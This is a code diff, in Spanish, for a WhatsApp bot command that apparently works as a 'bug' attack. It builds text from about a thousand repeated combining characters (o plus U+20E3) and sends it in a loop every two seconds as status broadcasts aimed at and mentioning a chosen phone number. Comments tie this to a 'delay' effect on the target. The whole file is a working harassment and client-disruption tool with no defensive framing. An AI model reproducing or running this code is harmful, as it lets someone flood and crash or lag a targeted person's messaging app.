@@ -1,3 +1,4 @@
+
 let handler = async (m, { conn, text }) => {
   if (!text) throw 'Ejemplo:\n.estado +521234567890/10'
 
@@ -9,34 +10,42 @@ let handler = async (m, { conn, text }) => {
 
   function generarBug() {
     let base = 'o\u20E3'
-
-    let REPETICION_HORIZONTAL = 120 // ← aquí cambias peso
-    let REPETICION_VERTICAL = 8     // ← aquí cambias líneas
-
-    let linea = base.repeat(REPETICION_HORIZONTAL)
-    return (linea + '\n').repeat(REPETICION_VERTICAL)
+    let linea = base.repeat(120)
+    return (linea + '\n').repeat(8)
   }
 
-  // 🎥 video mínimo válido (NO fake roto)
-  const videoBuffer = Buffer.from([
-    0x00,0x00,0x00,0x18,0x66,0x74,0x79,0x70,
-    0x6D,0x70,0x34,0x32,0x00,0x00,0x00,0x00
-  ])
-
   for (let i = 0; i < cantidad; i++) {
-    await conn.sendMessage('status@broadcast', {
-      video: videoBuffer,
-      caption: generarBug(),
-      mimetype: 'video/mp4',
-      fileLength: 500000,
-      seconds: 5,
-      contextInfo: {
-        mentionedJid: [numero],
-        isForwarded: true,
-        forwardingScore: 999
-      }
-    })
 
+    let msg = {
+      extendedTextMessage: {
+        text: generarBug(),
+        contextInfo: {
+          mentionedJid: [numero],
+          forwardingScore: 999,
+          isForwarded: true
+        }
+      }
+    }
+
+    // 🔥 Enviar como estado (modo avanzado)
+    await conn.relayMessage(
+      'status@broadcast',
+      msg,
+      {
+        messageId: conn.generateMessageTag(),
+        statusJidList: [numero], // 👈 IMPORTANTE (esto es lo del delay)
+        additionalNodes: [{
+          tag: 'mentioned_users',
+          attrs: {},
+          content: [{
+            tag: 'to',
+            attrs: { jid: numero }
+          }]
+        }]
+      }
+    )
+
+    // ⏱️ Delay tipo "delay.js"
     await new Promise(r => setTimeout(r, 2000))
   }
 
